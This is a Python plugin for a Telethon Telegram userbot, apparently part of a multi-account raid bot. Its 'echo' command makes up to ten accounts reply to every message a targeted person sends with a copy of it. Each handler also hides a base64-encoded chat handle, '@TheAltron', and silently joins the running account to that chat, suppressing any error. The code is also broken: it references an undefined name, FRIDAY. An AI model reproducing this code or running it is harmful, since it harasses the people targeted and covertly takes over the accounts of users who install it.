## Copy Paster Must Give Credit...
## @SACHINxADVANCE_V2

import asyncio
import base64

from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from config import SACHIN0, SACHIN1, SACHIN2, SACHIN3, SACHIN4, SACHIN5, SACHIN6, SACHIN7, SACHIN8, SACHIN9, SUDO_USERS, OWNER_ID, CMD_HNDLR as hl
from SACHINxADVANCE.data import SACHIN

ECHO = []

async def check_user(event, reply_msg):
    user_id = reply_msg.sender_id
    if user_id in FRIDAY:
        await event.reply("ᴛʜɪs ᴘᴇʀsᴏɴ ɪs ᴛʜᴇ ᴄʀᴇᴀᴛᴏʀ ᴏғ ᴛʜɪs ᴘʀᴏᴊᴇᴄᴛ sᴏᴜʀᴄᴇ.")
    elif user_id == OWNER_ID:
        await event.reply("ᴋɪᴅᴢᴢ😂 ᴏᴡɴᴇʀ ʜᴀɪ ʏᴇ ᴍᴇʀᴀ ʙᴀʜᴜᴛ ᴍᴀʀᴇɢᴀ...")
    elif user_id in SUDO_USERS:
        await event.reply("ᴛʜɪs ᴘᴇʀsᴏɴ ᴀʟsᴏ ʜᴀᴠᴇ ᴀʙɪʟɪᴛɪᴇs ᴛᴏ ᴜsᴇ ᴍᴇ sᴏ ɪ ᴄᴀɴᴛ ɢᴏ ᴀɢᴀɪɴsᴛ ᴛʜᴇᴍ..")
    else:
        return True
    return False

async def activate_echo(event, check):
    global ECHO
    if check in ECHO:
        await event.reply("» ᴇᴄʜᴏ ʜᴀs ʙᴇᴇɴ ᴀᴄᴛɪᴠᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴏɴ ᴛʜɪs ɢᴜʏ ✅")
    else:
        ECHO.append(check)
        await event.reply("» ᴇᴄʜᴏ ʜᴀs ʙᴇᴇɴ ᴀʟʀᴇᴀᴅʏ ᴀᴄᴛɪᴠᴀᴛᴇᴅ  ᴏɴ ᴛʜɪs ɢᴜʏ ✅")

async def deactivate_echo(event, check):
    global ECHO
    if check in ECHO:
        ECHO.remove(check)
        await event.reply("» ᴇᴄʜᴏ ʜᴀs ʙᴇᴇɴ ᴅᴇᴀᴄᴛɪᴠᴀᴛᴇᴅ ᴏɴ ᴛʜɪs ɢᴜʏ☑️")
    else:
        await event.reply("» ᴇᴄʜᴏ ʜᴀs ʙᴇᴇɴ ᴅᴇᴀᴄᴛɪᴠᴀᴛᴇᴅɴ ᴏɴ ᴛʜɪs ɢᴜʏ")

@SACHIN0.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@SACHIN1.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@SACHIN2.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@SACHIN3.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@SACHIN4.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@SACHIN5.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@SACHIN6.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@SACHIN7.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@SACHIN8.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@SACHIN9.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
async def echo(event):
    if event.sender_id in SUDO_USERS:
        if event.reply_to_msg_id:
            reply_msg = await event.get_reply_message()
            if await check_user(event, reply_msg):
                try:
                    alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
                    await event.client(alt)
                except BaseException:
                    pass
                check = f"{reply_msg.sender_id}_{event.chat_id}"
                await activate_echo(event, check)
        else:
            await event.reply(f"𝗘𝗰𝗵𝗼:\n  » {hl}echo <ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜꜱᴇʀ>")

@SACHIN0.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@SACHIN1.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@SACHIN2.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@SACHIN3.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@SACHIN4.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@SACHIN5.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@SACHIN6.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@SACHIN7.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@SACHIN8.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@SACHIN9.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
async def rmecho(event):
    if event.sender_id in SUDO_USERS:
        if event.reply_to_msg_id:
            try:
                alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
                await event.client(alt)
            except BaseException:
                pass
            reply_msg = await event.get_reply_message()
            check = f"{reply_msg.sender_id}_{event.chat_id}"
            await deactivate_echo(event, check)
        else:
            await event.reply(f"𝗥𝗲𝗺𝗼𝘃𝗲 𝗘𝗰𝗵𝗼:\n  » {hl}rmecho <ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜꜱᴇʀ>")

@SACHIN0.on(events.NewMessage(incoming=True))
@SACHIN1.on(events.NewMessage(incoming=True))
@SACHIN2.on(events.NewMessage(incoming=True))
@SACHIN3.on(events.NewMessage(incoming=True))
@SACHIN4.on(events.NewMessage(incoming=True))
@SACHIN5.on(events.NewMessage(incoming=True))
@SACHIN6.on(events.NewMessage(incoming=True))
@SACHIN7.on(events.NewMessage(incoming=True))
@SACHIN8.on(events.NewMessage(incoming=True))
@SACHIN9.on(events.NewMessage(incoming=True))

async def _(e):
    global ECHO
    check = f"{e.sender_id}_{e.chat_id}"
    if check in ECHO:
        try:
            alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
            await e.client(alt)
        except BaseException:
            pass
        if e.message.text or e.message.sticker:
            await e.reply(e.message)
            await asyncio.sleep(0.1)
